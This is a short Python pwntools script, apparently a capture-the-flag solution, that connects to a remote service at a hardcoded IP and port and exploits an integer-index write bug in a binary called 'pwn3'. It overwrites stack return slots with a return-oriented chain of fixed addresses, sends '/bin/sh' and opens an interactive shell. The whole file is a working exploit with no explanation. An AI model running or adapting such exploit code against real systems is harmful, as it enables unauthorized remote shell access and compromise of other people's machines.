from pwn import *
#from struct import pack
def setret(n,o):
	p.recvuntil('index')
	p.sendline('-'+str(2147483648-0xe-o))
	p.recvuntil('value')
	p.sendline(str(n))
#p=process('./pwn3')
p=remote('114.55.60.113','8000')
addesp=0x080483da
p.recvuntil('name')
p.sendline('fuck')
setret(0x08048470,0)
setret(addesp,1)
setret(0x804884B,2)
setret(0x804A030,3)
setret(0x12345678,4)
setret(0x08048420,5)
setret(0x12345678,6)
setret(0x804A030,7)
setret(0x12345678,8)
setret(0x12345678,9)
p.sendline('/bin/sh\x00')
p.interactive()

